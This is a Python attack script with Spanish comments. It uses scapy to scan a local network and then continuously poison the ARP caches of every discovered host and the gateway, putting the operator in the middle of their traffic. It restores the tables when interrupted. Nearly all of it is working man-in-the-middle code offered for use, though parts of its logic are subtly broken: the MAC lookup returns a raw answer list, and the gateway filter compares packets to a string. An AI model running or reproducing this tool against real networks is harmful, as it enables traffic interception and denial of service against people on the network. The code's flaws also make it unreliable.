# /usr/bin/python3
# -*- coding: utf-8 -*-

__file__ = 'ARP Spoofing'
__autor__ = 'Dessmon'

from scapy.all import *
import argparse
import sys
import time

from getpass import _raw_input

colors = {
    "BLACK": "\033[30m",
    "RED": "\033[31m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[33m",
    "BLUE": "\033[34m",
    "MAGENTA": "\033[35m",
    "CYAN": "\033[36m",
    "WHITE": "\033[37m",
    "RESET": "\033[39m",

    "LIGHTBLACK_EX": "\033[90m",
    "LIGHTRED_EX": "\033[91m",
    "LIGHTGREEN_EX": "\033[92m",
    "LIGHTYELLOW_EX": "\033[93m",
    "LIGHTBLUE_EX": "\033[94m",
    "LIGHTMAGENTA_EX": "\033[95m",
    "LIGHTCYAN_EX": "\033[96m",
    "LIGHTWHITE_EX": "\033[97m",
}


def Carga():

    def UP(n=1):
        return '\033[' + str(n) + 'A'

    def DOWN(n=1):
        return '\033[' + str(n) + 'B'

    def FORWARD(n=1):
        return '\033[' + str(n) + 'C'

    def BACK(n=1):
        return '\033[' + str(n) + 'D'

    def POS(x=1, y=1):
        return '\033[' + str(y) + ';' + str(x) + 'H'

    # cambiar el titulo de la terminal
    print("\033]2;=== AtackARP - cargando ===\007")
    print("\033[3J\033[H\033[2J")

    print("\n"+colors["LIGHTWHITE_EX"]+"      ["+colors["LIGHTGREEN_EX"])
    for arch in range(7, 108):
        time.sleep(0.01)
        print(UP(1)+"\033["+str(arch)+"C"+colors["LIGHTYELLOW_EX"]+"=>")
        print(UP(1)+colors["LIGHTWHITE_EX"]+str(arch-7)+"%")
    print(UP(1)+"\033["+str(arch+1)+"C"+colors["LIGHTWHITE_EX"]+"]")
    print(POS(25, 5) + colors["LIGHTGREEN_EX"] +
          '\t-------------------------------')
    print(POS(26, 6) + '\t ' +
          colors["LIGHTGREEN_EX"] + ">>> Proceso Carga Finalizado")
    print(POS(25, 7) + '\t-------------------------------\n')
    #_raw_input("\n\033[1;32mpresione enter para continuar   ")


# recibira parametros desde la linea de comandos
parse = argparse.ArgumentParser()
# 192.168.1.1/24
parse.add_argument("-r", "--range", help="Rango a escanear y spoofear")
parse.add_argument("-g", "--gateway",
                   help="puerta de enlaze o router")  # 192.168.1.1
parse = parse.parse_args()  # fin de la instanciazion.


def get_mac(gateway):  # esta fun obtendra la direcion MAC
    print("obteniendo la direcion MAC\n")
    arp_layer = ARP(pdst=gateway)  # pdst es la ip a mandar un paquete ARP
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # ip por defecto
    final_packet = broadcast/arp_layer  # esto finalizara la creacion del packete
    # srp mandara el packete y esperara a recibir uno, srp recibe el packete finalizado, timeout=2 establece 2 segundos de espera, verbose=True activa los mensajes por pantalla del proceso, esta func retornara una lista, la posicion 0 es la mac
    mac = srp(final_packet, timeout=2, verbose=True)[0]
    mac.rawhexdump()
    print("\n\tdatos recividos: " + str(mac)+"\t\n")
    #mac = mac[0][1].hwsrc
    return mac


def scann_net(rango, gateway):  # este escaneara toda la red.
    print("conezando el escaneo\n")
    lista_hosts = list()
    # esto crearia un packete que se enviaria a toda la red
    arp_layer = ARP(pdst=rango)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/arp_layer
    answers = srp(final_packet, timeout=2, verbose=True)[0]

    cantidad = 0

    for a in answers:
        if a != gateway:
            cantidad += 1
            print(
                "{}[{}+{}] {} HOST:{} \t MAC:{}".format(
                    colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"], cantidad, a[1].psrc, a[1].hwsrc)
            )
            lista_hosts.append([a[1].psrc, a[1].hwsrc])

    delete = _raw_input("\n{}[{}*{}] Desea eliminar alguna direcion IP/MAC (Y/N)?: ".format(
        colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"]))
    print()
    if delete.upper() == "Y":
        while True:
            delete = _raw_input("\033[1A{}[{}*{}] Introduce el numero de la ip a eliminar, para salir del bucle introduzca 0: ".format(
                colors["LIGHTWHITE_EX"], colors["LIGHTBLUE_EX"], colors["LIGHTWHITE_EX"]))
            if int(delete) > cantidad:
                print("{}[{}+{}]este numero no esta registrado: "+str(delete)+"".format(
                    colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
                pass
            elif int(delete) == 0:
                break
            else:
                print("\033[1B"+80*" ")
                print("\033[1ASe elimino correctamente: {}\033[1A\033[1A".format(
                    lista_hosts[int(delete)-1]))
                lista_hosts[int(delete)-1] = ''
                pass
        for i in range(2):
            print("\033[1B"+80*" ")
        print(6*"\033[1A")
    elif delete.upper() == "N":
        pass
    else:
        print("\033[1A{}[{}+{}] Por defecto no se eliminara ninguna IP/MAC\n\n".format(
            colors["LIGHTWHITE_EX"], colors["LIGHTMAGENTA_EX"], colors["LIGHTWHITE_EX"]))

    p = 0

    for e in lista_hosts:
        if e == "":
            lista_hosts.pop(p)
        p += 1
    del (p)
    if lista_hosts == ['', ''] or lista_hosts == ['']:
        print("{}[{}-{}] Usted elimino todos los posibles objetivos".format(
            colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
        exit(1)
    return lista_hosts


# restaurara las tablas ARP, si no se hace la conexion se cortaria generando una  Denegacion De Servicio(DOS)
def restore_arp(destip, sourceip, hwsrc, hwdst):
    # la restauracion de las tablas ARP se realizara despues del ataque.
    dest_mac = hwdst  # MAC destino
    source_mac = hwsrc
    # destip=ip destino, psrc=ip origen, hwsrc=direcion MAC origen
    packet = ARP(op=2, pdst=destip, hwdst=dest_mac,
                 psrc=sourceip, hwsrc=source_mac)
# packet[0].rawhexdump()
    send(packet, verbose=True)  # envio del packete sin esperar respuesta
    return 1


# func que spoofeara a la red, mandando un packete hacindose pasar por otroa ip, ejemplo la del router
def arp_spoofing(hwdst, pdst, psrc):
    spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
    try:
        print("{}".format(spoofer_packet[pdst]))
        send(spoofer_packet, verbose=True)
    except StopIteration:
        print("error")
    return 1


def main():
    # True si el usuario introducio todo los parametros.
    if parse.range and parse.gateway:
        print("\033]2;=== AtackARP - obteniendo MACs ===\007")
        mac_gateway = get_mac(parse.gateway)
        print("\033]2;=== AtackARP - escaneando ===\007")
        hosts = scann_net(parse.range, parse.gateway)
        p = 0

        for e in hosts:
            if e == "":
                hosts.pop(p)
            p += 1

        time.sleep(3)
        try:
            print("\n{}[{}*{}] Corriendo ...".format(colors["LIGHTWHITE_EX"],
                  colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"]))
            print("{}[{}*{}] Para finalizar el ataque pulse Ctrl + c".format(
                colors["LIGHTWHITE_EX"], colors["LIGHTYELLOW_EX"], colors["LIGHTWHITE_EX"]))
            print("\033]2;=== AtackARP - atacando ===\007")
            while True:
                for i in range(0, len(hosts)):
                    mac_target = hosts[i][1]
                    ip_target = hosts[i][0]
                    gateway = parse.gateway
                    # packete para el dispositivo victima
                    arp_spoofing(mac_gateway, gateway, ip_target)
                    # packete para el router
                    arp_spoofing(mac_target, ip_target, gateway)

                    print("\033["+str(32+len(hosts)+i)+";1H{}[{}+{}] Subplantando a: {}".format(
                        colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"], ip_target))
                    sys.stdout.flush()

        except KeyboardInterrupt:
            print("\033]2;=== AtackARP - Restaurando tablas ARP ===\007")
            print("\n\nRestaurando tablas ARP")
            for i in hosts:
                mac_target = i[1]
                ip_target = i[0]
                gateway = parse.gateway
                restore_arp(gateway, ip_target, mac_gateway, mac_target)
                restore_arp(ip_target, gateway, mac_target, mac_gateway)
            exit(0)

    else:
        print("Falta opciones"+colors["RESET"])


if __name__ == "__main__":
    Carga()
    main()
